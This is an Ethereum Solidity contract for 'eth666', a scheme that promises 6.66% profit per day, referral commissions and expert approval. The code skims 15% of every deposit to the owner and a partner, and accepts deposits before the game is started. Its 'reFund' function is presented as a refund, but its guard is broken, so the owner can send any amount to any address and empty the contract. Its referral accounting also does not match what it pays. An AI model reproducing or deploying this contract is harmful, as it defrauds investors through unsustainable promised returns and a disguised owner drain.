1 pragma solidity ^0.4.25;
2 
3 /** 
4  * contract for eth666.me
5  * GAIN 6.66% PER 24 HOURS (every 5900 blocks)
6  * 
7  *  How to use:
8  *  1. Send any amount of ether to make an investment
9  *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)
10  *  OR
11  *  2b. Send more ether to reinvest AND get your profit at the same time
12  *
13  * 
14  *  5% for every deposit of your direct partners
15  *  If you want to invite your partners to join our program ,They have to specify your ETH wallet in a "DATA" field during a deposit transaction.
16  * 
17  * 
18  * RECOMMENDED GAS LIMIT: 70000
19  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
20  *
21  * Contract reviewed and approved by pros!
22 **/
23 
24 contract eth666{
25 
26     address public owner;
27     address public partner;    
28     
29 	mapping (address => uint256) deposited;
30 	mapping (address => uint256) withdrew;
31 	mapping (address => uint256) refearned;
32 	mapping (address => uint256) blocklock;
33 
34 	uint256 public totalDepositedWei = 0;
35 	uint256 public totalWithdrewWei = 0;
36 	uint256 public investorNum = 0;
37 	
38 	//if isStart = 0 !!!!DO NOT INVEST!!!! please wait for gameStart()
39 	uint 	public isStart; 
40 
41 	event invest(address indexed beneficiary, uint amount);
42 
43     constructor () public {
44         owner   = msg.sender;
45         partner = msg.sender;
46         isStart = 0;
47     }
48     
49     modifier onlyOwner {
50         require (msg.sender == owner, "OnlyOwner methods called by non-owner.");
51         _;
52     }    
53     
54     //if you want to be a partner , contact admin
55     function setPartner(address newPartner) external onlyOwner {
56         partner = newPartner;
57     }
58  
59  	function gameStart(uint num) external onlyOwner{
60  		isStart = num;
61  	}
62 
63 	function() payable external {
64 		emit invest(msg.sender,msg.value);
65 		uint256 admRefPerc = msg.value / 10;
66 		uint256 advPerc    = msg.value / 20;
67 
68 		owner.transfer(admRefPerc);
69 		partner.transfer(advPerc);
70 
71 		if (deposited[msg.sender] != 0 && isStart != 0) {
72 			address investor = msg.sender;
73             // calculate profit amount as such:
74             // amount = (amount invested) * 6.66% * (blocks since last transaction) / 5900
75             // 5900 is an average block count per day produced by Ethereum blockchain
76             uint256 depositsPercents = deposited[msg.sender] * 666 / 10000 * (block.number - blocklock[msg.sender]) /5900;
77 			investor.transfer(depositsPercents);
78 
79 			withdrew[msg.sender] += depositsPercents;
80 			totalWithdrewWei += depositsPercents;
81 		} else if (deposited[msg.sender] == 0 && isStart != 0)
82 			investorNum += 1;
83 
84 		address referrer = bytesToAddress(msg.data);
85 		if (referrer > 0x0 && referrer != msg.sender) {
86 			referrer.transfer(admRefPerc);
87 			refearned[referrer] += advPerc;
88 		}
89 
90 		blocklock[msg.sender] = block.number;
91 		deposited[msg.sender] += msg.value;
92 		totalDepositedWei += msg.value;
93 	}
94 	
95 	//refund to user who misunderstood the game . 'withdrew' must = 0
96     function reFund(address exitUser, uint a) external onlyOwner {
97         uint256 c1 = withdrew[exitUser];
98         if(c1 == 0)
99           uint256 reFundValue = deposited[exitUser];
100           exitUser.transfer(a);
101           deposited[exitUser] = 0;
102     }
103     
104 	function userDepositedWei(address _address) public view returns (uint256) {
105 		return deposited[_address];
106     }
107 
108 	function userWithdrewWei(address _address) public view returns (uint256) {
109 		return withdrew[_address];
110     }
111 
112 	function userDividendsWei(address _address) public view returns (uint256) {
113         return deposited[_address] * 666 / 10000 * (block.number - blocklock[_address]) / 5900;
114     }
115 
116 	function userReferralsWei(address _address) public view returns (uint256) {
117 		return refearned[_address];
118     }
119 
120 	function bytesToAddress(bytes bys) private pure returns (address addr) {
121 		assembly {
122 			addr := mload(add(bys, 20))
123 		}
124 	}
125 }